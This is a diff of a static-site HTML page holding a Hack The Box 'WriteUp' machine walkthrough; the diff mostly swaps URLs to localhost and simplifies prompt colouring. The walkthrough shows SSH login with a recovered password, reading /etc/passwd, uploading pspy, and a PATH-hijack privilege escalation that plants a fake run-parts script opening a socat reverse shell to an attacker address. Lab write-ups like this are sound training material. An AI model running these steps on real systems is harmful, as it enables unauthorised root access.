@@ -7,7 +7,7 @@
     <link rel="stylesheet" href="/assets/css/style.css?v=">
     
     
-    <meta property="og:image" content="https://jebidiah-anthony.github.io/boxes/screenshots/31_writeup/writeup.jpg" />
+    <meta property="og:image" content="http://localhost:4000/boxes/screenshots/31_writeup/writeup.jpg" />
     
     
     <meta property="og:title" content="HTB WriteUp" />
@@ -19,11 +19,11 @@
 <meta property="og:locale" content="en_US" />
 <meta name="description" content="10.10.10.138 20 pts" />
 <meta property="og:description" content="10.10.10.138 20 pts" />
-<link rel="canonical" href="https://jebidiah-anthony.github.io/boxes/31_WriteUp.html" />
-<meta property="og:url" content="https://jebidiah-anthony.github.io/boxes/31_WriteUp.html" />
+<link rel="canonical" href="http://localhost:4000/boxes/31_WriteUp.html" />
+<meta property="og:url" content="http://localhost:4000/boxes/31_WriteUp.html" />
 <meta property="og:site_name" content="jebidiah-anthony" />
 <script type="application/ld+json">
-{"@type":"WebPage","url":"https://jebidiah-anthony.github.io/boxes/31_WriteUp.html","headline":"HTB WriteUp","description":"10.10.10.138 20 pts","@context":"https://schema.org"}</script>
+{"@type":"WebPage","url":"http://localhost:4000/boxes/31_WriteUp.html","headline":"HTB WriteUp","description":"10.10.10.138 20 pts","@context":"https://schema.org"}</script>
 <!-- End Jekyll SEO tag -->
  
   </head>
@@ -245,24 +245,24 @@ Disallow: /writeup/
 <h2 id="part-4--generate-a-user-shell">PART 4 : GENERATE A USER SHELL</h2>
 
 <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>ssh <span class="nt">-l</span> jkr 10.10.10.138
-<span class="gp">$</span><span class="w"> </span>jkr@10.10.10.138's password: raykayjay9
-<span class="go">
-</span><span class="gp"><span style="color:green">jkr@writeup:</span><span style="color:blue">~</span>$</span><span class="w"> 
+<span class="gp">$</span><span class="w"> </span>jkr@10.10.10.138<span class="s1">'s password: raykayjay9
+</span><span class="go">
+</span><span class="gp">jkr@writeup:~$</span><span class="w"> 
 </span><span class="go">
 </span></code></pre></div></div>
 
 <p>Enumerating the system:</p>
 
-<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp"><span style="color:green">jkr@writeup:</span><span style="color:blue">~</span>$</span><span class="w"> </span><span class="nb">uname</span> <span class="nt">-mnor</span>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">jkr@writeup:~$</span><span class="w"> </span><span class="nb">uname</span> <span class="nt">-mnor</span>
 <span class="go">
   writeup 4.9.0-8-amd64 x86_64 GNU/Linux
 
-</span><span class="gp"><span style="color:green">jkr@writeup:</span><span style="color:blue">~</span>$</span><span class="w"> </span><span class="nb">cat</span> /etc/passwd | <span class="nb">grep</span> <span class="nt">-e</span> <span class="s2">"sh$"</span>
+</span><span class="gp">jkr@writeup:~$</span><span class="w"> </span><span class="nb">cat</span> /etc/passwd | <span class="nb">grep</span> <span class="nt">-e</span> <span class="s2">"sh$"</span>
 <span class="go">
   root:x:0:0:root:/root:/bin/bash
   jkr:x:1000:1000:jkr,,,:/home/jkr:/bin/bash
 
-</span><span class="gp"><span style="color:green">jkr@writeup:</span><span style="color:blue">~</span>$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-lah</span> ~
+</span><span class="gp">jkr@writeup:~$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-lah</span> ~
 <span class="go">
   drwxr-xr-x 2 jkr  jkr  4.0K Oct 13 10:28 .
   drwxr-xr-x 3 root root 4.0K Apr 19 04:14 ..
@@ -272,7 +272,7 @@ Disallow: /writeup/
   -rw-r--r-- 1 jkr  jkr   675 Apr 19 04:14 .profile
   -r--r--r-- 1 root root   33 Apr 19 08:43 user.txt
 
-</span><span class="gp"><span style="color:green">jkr@writeup:</span><span style="color:blue">~</span>$</span><span class="w"> </span><span class="nb">cat</span> ~/user.txt
+</span><span class="gp">jkr@writeup:~$</span><span class="w"> </span><span class="nb">cat</span> ~/user.txt
 <span class="go">
   d4e4........................f978
 
@@ -289,15 +289,15 @@ Disallow: /writeup/
 </span><span class="gp">  pspy64s        100%[====================================================&gt;</span><span class="o">]</span>   1.10M
 <span class="go">
 </span><span class="gp">$</span><span class="w"> </span>scp ./pspy64s jkr@10.10.10.138:/tmp/pspy64s
-<span class="gp">$</span><span class="w"> </span>jkr@10.10.10.138's password: raykayjay9
-<span class="go">
+<span class="gp">$</span><span class="w"> </span>jkr@10.10.10.138<span class="s1">'s password: raykayjay9
+</span><span class="go">
   pspy64s                                                                100% 1129KB
 
-</span><span class="gp"><span style="color:green">jkr@writeup:</span><span style="color:blue">~</span>$</span><span class="w"> </span><span class="nb">cd</span> /tmp
+</span><span class="gp">jkr@writeup:~$</span><span class="w"> </span><span class="nb">cd</span> /tmp
 <span class="go">
-</span><span class="gp"><span style="color:green">jkr@writeup:</span><span style="color:blue">/tmp</span>$</span><span class="w"> </span><span class="nb">chmod</span> +x ./pspy64s
+</span><span class="gp">jkr@writeup:/tmp$</span><span class="w"> </span><span class="nb">chmod</span> +x ./pspy64s
 <span class="go">
-</span><span class="gp"><span style="color:green">jkr@writeup:</span><span style="color:blue">/tmp</span>$</span><span class="w"> </span>./pspy64s
+</span><span class="gp">jkr@writeup:/tmp$</span><span class="w"> </span>./pspy64s
 <span class="go">
   pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855
 
@@ -318,9 +318,9 @@ Disallow: /writeup/
 <p>Connect to another <strong><code class="highlighter-rouge">ssh</code></strong> instance:</p>
 
 <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>ssh <span class="nt">-l</span> jkr 10.10.10.138
-<span class="gp">$</span><span class="w"> </span>jkr@10.10.10.138's password: raykayjay9
-<span class="go">
-</span><span class="gp"><span style="color:green">jkr@writeup:</span><span style="color:blue">~</span>$</span><span class="w"> 
+<span class="gp">$</span><span class="w"> </span>jkr@10.10.10.138<span class="s1">'s password: raykayjay9
+</span><span class="go">
+</span><span class="gp">jkr@writeup:~$</span><span class="w"> 
 </span><span class="go">
 </span></code></pre></div></div>
 
@@ -339,11 +339,11 @@ Disallow: /writeup/
 
 <p>This series of events happens everytime a connection via <strong style="color:orange">ssh</strong> is established.</p>
 
-<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp"><span style="color:green">jkr@writeup:</span><span style="color:blue">~</span>$</span><span class="w"> </span><span class="nb">env</span> | <span class="nb">grep </span>PATH
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">jkr@writeup:~$</span><span class="w"> </span><span class="nb">env</span> | <span class="nb">grep </span>PATH
 <span class="go">
   PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
 
-</span><span class="gp"><span style="color:green">jkr@writeup:</span><span style="color:blue">~</span>$</span><span class="w"> </span>find / <span class="nt">-name</span> run-parts <span class="nt">-type</span> f 2&gt;/dev/null
+</span><span class="gp">jkr@writeup:~$</span><span class="w"> </span>find / <span class="nt">-name</span> run-parts <span class="nt">-type</span> f 2&gt;/dev/null
 <span class="go">
   /bin/run-parts
 
@@ -355,7 +355,7 @@ Disallow: /writeup/
 
 <p>Maybe the exploit lies on how the environment variable, <strong><code class="highlighter-rouge">$PATH</code></strong>, is set for the <strong><code class="highlighter-rouge">run-parts</code></strong> binary.</p>
 
-<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp"><span style="color:green">jkr@writeup:</span><span style="color:blue">~</span>$</span><span class="w"> </span>find / <span class="nt">-type</span> d <span class="nt">-writable</span> 2&gt;/dev/null | <span class="nb">grep </span>bin
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">jkr@writeup:~$</span><span class="w"> </span>find / <span class="nt">-type</span> d <span class="nt">-writable</span> 2&gt;/dev/null | <span class="nb">grep </span>bin
 <span class="go">
   /usr/local/bin
   /usr/local/sbin
@@ -366,17 +366,17 @@ Disallow: /writeup/
 
 <p>Since the <strong><code class="highlighter-rouge">run-parts</code></strong> binary is run with reference to the <strong><code class="highlighter-rouge">$PATH</code></strong> environment variable, then maybe the first occurence (since <strong><code class="highlighter-rouge">/usr/local/bin</code></strong> and <strong><code class="highlighter-rouge">/usr/local/sbin</code></strong> are listed before <strong><code class="highlighter-rouge">/bin</code></strong>) or all occurences of the <strong><code class="highlighter-rouge">run-parts</code></strong> binary found in <strong><code class="highlighter-rouge">$PATH</code></strong> will be executed.</p>
 
-<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp"><span style="color:green">jkr@writeup:</span><span style="color:blue">~</span>$</span><span class="w"> </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s1">'\x23\x21/bin/sh\nsocat TCP-CONNECT:10.10.15.13:4444 EXEC:sh,pty,stderr,setsid,sigint,sane'</span> <span class="o">&gt;</span> /usr/local/sbin/run-parts
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">jkr@writeup:~$</span><span class="w"> </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s1">'\x23\x21/bin/sh\nsocat TCP-CONNECT:10.10.15.13:4444 EXEC:sh,pty,stderr,setsid,sigint,sane'</span> <span class="o">&gt;</span> /usr/local/sbin/run-parts
 <span class="go">
-</span><span class="gp"><span style="color:green">jkr@writeup:</span><span style="color:blue">~</span>$</span><span class="w"> </span><span class="nb">chmod</span> +x /usr/local/sbin/run-parts
+</span><span class="gp">jkr@writeup:~$</span><span class="w"> </span><span class="nb">chmod</span> +x /usr/local/sbin/run-parts
 </code></pre></div></div>
 
 <p>Connect again via <strong><code class="highlighter-rouge">ssh</code></strong>:</p>
 
 <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>ssh <span class="nt">-l</span> jkr 10.10.10.138
-<span class="gp">$</span><span class="w"> </span>jkr@10.10.10.138's password: raykayjay9
-<span class="go">
-</span><span class="gp"><span style="color:green">jkr@writeup:</span><span style="color:blue">~</span>$</span><span class="w"> 
+<span class="gp">$</span><span class="w"> </span>jkr@10.10.10.138<span class="s1">'s password: raykayjay9
+</span><span class="go">
+</span><span class="gp">jkr@writeup:~$</span><span class="w"> 
 </span><span class="go">
 </span></code></pre></div></div>
 
